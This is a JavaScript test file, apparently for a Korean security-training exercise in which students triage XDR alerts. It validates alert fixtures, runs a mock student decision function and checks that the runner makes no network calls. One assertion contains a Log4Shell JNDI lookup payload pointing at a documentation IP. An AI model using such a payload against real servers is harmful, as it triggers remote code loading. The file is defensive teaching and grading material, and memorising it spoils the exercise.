import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { mkdtemp, mkdir, readFile, readdir, rm, writeFile, cp } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { test } from 'node:test';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');
const MODULE_KEYS = ['brute-force', 'web-injection', 'known-cve', 'persistence', 'privilege', 'exfiltration'];
const DOC_IP = /^(192\.0\.2|198\.51\.100|203\.0\.113)\.(?:[1-9]|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))$/;

test('경보 묶음은 정답 없이 20건에서 40건입니다', async () => {
  for (const moduleKey of MODULE_KEYS) {
    const fixture = JSON.parse(await readFile(join(root, 'xdr', 'fixtures', `${moduleKey}.json`), 'utf8'));
    assert.equal(fixture.schema, 'aleph.xdr.fixture.v1');
    assert.equal(fixture.moduleKey, moduleKey);
    assert.equal(Object.hasOwn(fixture, 'answers'), false);
    assert.ok(fixture.alerts.length >= 20 && fixture.alerts.length <= 40, moduleKey);
    const ids = new Set();
    for (const alert of fixture.alerts) {
      assert.equal(alert.agent.name, 'choi-bujang-pc');
      assert.equal(ids.has(alert.id), false);
      ids.add(alert.id);
      assert.equal(Object.hasOwn(alert, 'action'), false);
      assert.equal(Object.hasOwn(alert, 'answer'), false);
      for (const field of ['srcip', 'dstip']) {
        if (alert.data[field]) assert.match(alert.data[field], DOC_IP, `${alert.id} ${field}`);
      }
    }
  }
  const cve = await readFile(join(root, 'xdr', 'fixtures', 'known-cve.json'), 'utf8');
  assert.match(cve, /\$\{jndi:ldap:\/\/203\.0\.113\.9\/x\}/);
  assert.equal(cve.includes('${jndi:ldap://') && cve.includes('jndi:rmi'), false);
});

test('가짜 decide 가 result.json 형식과 건수를 만듭니다', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'xdr-run-'));
  try {
    await mkdir(join(dir, 'scripts'), { recursive: true });
    await mkdir(join(dir, 'xdr', 'fixtures'), { recursive: true });
    await mkdir(join(dir, 'xdr', 'brute-force'), { recursive: true });
    await cp(join(root, 'scripts', 'xdr-run.mjs'), join(dir, 'scripts', 'xdr-run.mjs'));
    const alerts = ['a-block', 'a-alert', 'a-record', 'a-bad', 'a-throw'].map((id) => ({
      id,
      timestamp: '2026-09-27T09:00:00+09:00',
      agent: { name: 'choi-bujang-pc' },
      rule: { level: 3, description: '시험 경보', mitre: [] },
      data: { srcip: '192.0.2.10', srcuser: 'user01' },
    }));
    await writeFile(join(dir, 'xdr', 'fixtures', 'brute-force.json'), `${JSON.stringify({
      schema: 'aleph.xdr.fixture.v1', moduleKey: 'brute-force', alerts,
    }, null, 2)}\n`);
    await writeFile(join(dir, 'xdr', 'brute-force', 'decide.mjs'), `
      export async function decide(alert) {
        if (alert.id === 'a-bad') return { action: 'ignore', confidence: 2, reason: '틀림' };
        if (alert.id === 'a-throw') throw new Error('학생 코드 오류');
        if (alert.id === 'a-block') return { action: 'block', confidence: 0.9, reason: '명확한 공격' };
        if (alert.id === 'a-alert') return Promise.resolve({ action: 'alert', confidence: 0.6, reason: '애매한 시도' });
        return { action: 'record', confidence: 0, reason: '정상 이벤트' };
      }
    `);
    const child = spawn(process.execPath, ['scripts/xdr-run.mjs', 'brute-force'], { cwd: dir, windowsHide: true });
    let stderr = '';
    child.stderr.on('data', (chunk) => { stderr += chunk; });
    const code = await new Promise((resolvePromise, reject) => {
      child.on('error', reject);
      child.on('exit', resolvePromise);
    });
    assert.equal(code, 0);
    assert.deepEqual(stderr.trim().split(/\r?\n/), ['형식 오류: a-bad', '형식 오류: a-throw']);
    const result = JSON.parse(await readFile(join(dir, 'xdr', 'brute-force', 'result.json'), 'utf8'));
    assert.equal(result.schema, 'aleph.xdr.result.v1');
    assert.equal(result.moduleKey, 'brute-force');
    assert.deepEqual(result.decisions.map((item) => item.alertId), alerts.map((item) => item.id));
    assert.deepEqual(result.decisions.map((item) => item.action), ['block', 'alert', 'record', 'record', 'record']);
    assert.equal(result.decisions[0].confidence, 0.9);
    assert.equal(typeof result.decisions[0].reason, 'string');
    assert.deepEqual(result.counts, { block: 1, alert: 1, record: 3 });
    assert.equal(result.counts.block + result.counts.alert + result.counts.record, result.decisions.length);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('실행기는 네트워크 모듈을 부르지 않습니다', async () => {
  const source = await readFile(join(root, 'scripts', 'xdr-run.mjs'), 'utf8');
  assert.equal(/from ['"]node:(?:http|https|net|dns)['"]|fetch\(/.test(source), false);
  const names = await readdir(join(root, 'xdr'));
  assert.equal(names.includes('README.md'), true);
});
